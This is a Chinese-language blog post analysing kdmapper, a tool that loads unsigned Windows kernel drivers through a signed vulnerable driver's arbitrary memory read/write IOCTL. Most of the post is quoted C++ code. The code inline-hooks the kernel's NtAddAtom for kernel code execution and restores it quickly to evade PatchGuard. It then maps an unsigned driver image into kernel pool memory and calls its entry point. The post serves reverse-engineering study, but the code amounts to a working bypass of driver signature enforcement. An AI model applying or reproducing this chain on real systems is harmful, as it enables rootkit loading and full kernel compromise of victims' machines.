---
layout: post
title: "加载无签名驱动"
date: 2021-07-19 14:16:48 +0800
categories: driver re
---

由于dse的出现，未经签名的驱动无法被内核加载，而使用带有签名的漏洞驱动通过利用漏洞的方式加载无签名的驱动是一种可行的方式。本文将通过分析kdmapper的代码来探究加载无签名驱动的方法。

## 漏洞分析

kdmapper通过加载有签名的漏洞驱动并利用漏洞来实现加载未签名驱动的功能。漏洞的位置位于驱动ioctl处理函数中，驱动在初始化过程中注册了ioctl处理函数并在控制码为0x80862007的对应函数中提供了任意地址读写、获取物理地址、映射任意地址等功能

![image-20210719111311394](/assets/images/image-20210719111311394.png)

映射地址功能

![image-20210719111346099](/assets/images/image-20210719111346099.png)

获取物理地址

![image-20210719111406927](/assets/images/image-20210719111406927.png)



任意地址读写

![image-20210719111433722](/assets/images/image-20210719111433722.png)

## 从任意地址写到代码执行

由于漏洞驱动提供了获取物理地址以及映射物理地址的功能，因此kdmapper可以使用映射物理地址的方式读写被保护的内存，通过对内核函数进行inline hook的方法进行劫持实现任意代码执行。

```c++
		//获取r3 NtAddAtom地址
		HMODULE ntdll = GetModuleHandleA("ntdll.dll");

		const auto NtAddAtom = reinterpret_cast<void*>(GetProcAddress(ntdll, "NtAddAtom"));

		//inline hook 使用的跳转代码
		uint8_t kernel_injected_jmp[] = { 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 };
		uint8_t original_kernel_function[sizeof(kernel_injected_jmp)];
		*(uint64_t*)&kernel_injected_jmp[2] = kernel_function_address;
		
		//获取r0 NtAddAtom地址
		static uint64_t kernel_NtAddAtom = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "NtAddAtom");


		// Overwrite the pointer with kernel_function_address
		if (!WriteToReadOnlyMemory(device_handle, kernel_NtAddAtom, &kernel_injected_jmp, sizeof(kernel_injected_jmp)))
			return false;

		// Call function
		if constexpr (!call_void) {
			using FunctionFn = T(__stdcall*)(A...);
			const auto Function = reinterpret_cast<FunctionFn>(NtAddAtom);

			*out_result = Function(arguments...);
		}
		else {
			using FunctionFn = void(__stdcall*)(A...);
			const auto Function = reinterpret_cast<FunctionFn>(NtAddAtom);

			Function(arguments...);
		}

		// Restore the pointer/jmp
		WriteToReadOnlyMemory(device_handle, kernel_NtAddAtom, original_kernel_function, sizeof(kernel_injected_jmp));

```

在inlinehook函数之后，通过在r3调用NtAddAtom触发inline hook。为了避免被PG检测到，在调用完成后立即恢复原函数

## 内存加载驱动

驱动文件同样是PE结构的文件，因此内存加载方式几乎一样，在处理完导入表和重定位后，三环程序通过漏洞驱动将驱动镜像写入到分配好的内核地址中，接着调用驱动的入口函数完成驱动的加载。

```c++
	std::vector<uint8_t> raw_image = { 0 };

	if (!utils::ReadFileToMemory(driver_path, &raw_image)) {
		Log(L"[-] Failed to read image to memory" << std::endl);
		return 0;
	}

	const PIMAGE_NT_HEADERS64 nt_headers = portable_executable::GetNtHeaders(raw_image.data());

	const uint32_t image_size = nt_headers->OptionalHeader.SizeOfImage;

	void* local_image_base = VirtualAlloc(nullptr, image_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (!local_image_base)
		return 0;

	DWORD TotalVirtualHeaderSize = (IMAGE_FIRST_SECTION(nt_headers))->VirtualAddress;

	uint64_t kernel_image_base = intel_driver::AllocatePool(iqvw64e_device_handle, nt::POOL_TYPE::NonPagedPool, image_size - (destroyHeader ? TotalVirtualHeaderSize : 0));

	do {
		// Copy image headers

		memcpy(local_image_base, raw_image.data(), nt_headers->OptionalHeader.SizeOfHeaders);

		// Copy image sections

		const PIMAGE_SECTION_HEADER current_image_section = IMAGE_FIRST_SECTION(nt_headers);

		for (auto i = 0; i < nt_headers->FileHeader.NumberOfSections; ++i) {
			auto local_section = reinterpret_cast<void*>(reinterpret_cast<uint64_t>(local_image_base) + current_image_section[i].VirtualAddress);
			memcpy(local_section, reinterpret_cast<void*>(reinterpret_cast<uint64_t>(raw_image.data()) + current_image_section[i].PointerToRawData), current_image_section[i].SizeOfRawData);
		}

		uint64_t realBase = kernel_image_base;
		if (destroyHeader) {
			kernel_image_base -= TotalVirtualHeaderSize;
			Log(L"[+] Skipped 0x" << std::hex << TotalVirtualHeaderSize << L" bytes of PE Header" << std::endl);
		}

		// Resolve relocs and imports

		RelocateImageByDelta(portable_executable::GetRelocs(local_image_base), kernel_image_base - nt_headers->OptionalHeader.ImageBase);

		if (!ResolveImports(iqvw64e_device_handle, portable_executable::GetImports(local_image_base))) {
			Log(L"[-] Failed to resolve imports" << std::endl);
			kernel_image_base = realBase;
			break;
		}

		// Write fixed image to kernel

		if (!intel_driver::WriteMemory(iqvw64e_device_handle, realBase, (PVOID)((uintptr_t)local_image_base + (destroyHeader ? TotalVirtualHeaderSize : 0)), image_size - (destroyHeader ? TotalVirtualHeaderSize : 0))) {
			Log(L"[-] Failed to write local image to remote image" << std::endl);
			kernel_image_base = realBase;
			break;
		}

		// Call driver entry point

		const uint64_t address_of_entry_point = kernel_image_base + nt_headers->OptionalHeader.AddressOfEntryPoint;
        
		NTSTATUS status = 0;

		if (!intel_driver::CallKernelFunction(iqvw64e_device_handle, &status, address_of_entry_point, param1, param2)) {
			Log(L"[-] Failed to call driver entry" << std::endl);
			kernel_image_base = realBase;
			break;
		}

		if (free)
			intel_driver::FreePool(iqvw64e_device_handle, realBase);

		VirtualFree(local_image_base, 0, MEM_RELEASE);
		return realBase;

	} while (false);


	VirtualFree(local_image_base, 0, MEM_RELEASE);

	intel_driver::FreePool(iqvw64e_device_handle, kernel_image_base);
```

